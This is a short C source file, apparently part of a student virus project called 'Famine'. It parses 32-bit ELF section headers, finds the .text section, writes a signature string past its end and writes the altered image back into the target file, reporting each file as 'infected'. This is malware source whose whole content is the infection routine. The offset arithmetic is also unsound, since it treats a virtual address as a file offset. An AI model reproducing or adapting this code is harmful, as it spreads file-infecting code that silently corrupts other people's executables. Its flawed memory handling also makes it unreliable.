#include "famine.h"

u_int32_t	section_getter32(char *ptr, size_t size, int fd)
{
	Elf32_Ehdr *ehdr = (Elf32_Ehdr*) ptr;

	u_int16_t	shnum			= ehdr->e_shnum;
	Elf32_Off	sht_offset		= ehdr->e_shoff;
	Elf32_Shdr	*shdr = (Elf32_Shdr *) (ptr + sht_offset);
	char 		*ajustor = ptr + (shdr + ehdr->e_shstrndx)->sh_offset;

	char		*message = "face a la patate, tout est possible #Famine (jucapik)";

	for (int i = 0 ; i < shnum ; ++i)
	{
		if (!strcmp((char*)(ajustor + shdr[i].sh_name), ".text"))
		{
			size_t sectionaddr = (size_t)shdr[i].sh_addr;
			size_t sectionsize = shdr[i].sh_size;

			memmove(ptr + sectionaddr + sectionsize + 16, message, strlen(message));
		      	write(fd, ptr, size);	
		}
	}
	return (0);
}

int		write_string32(char *ptr, size_t size, char *path, int fd)
{
	u_int32_t	sectionoff;
	sectionoff = section_getter32(ptr, size, fd);

	printf(GREEN"infected %s\n"RESET, path);

	return (0);
}
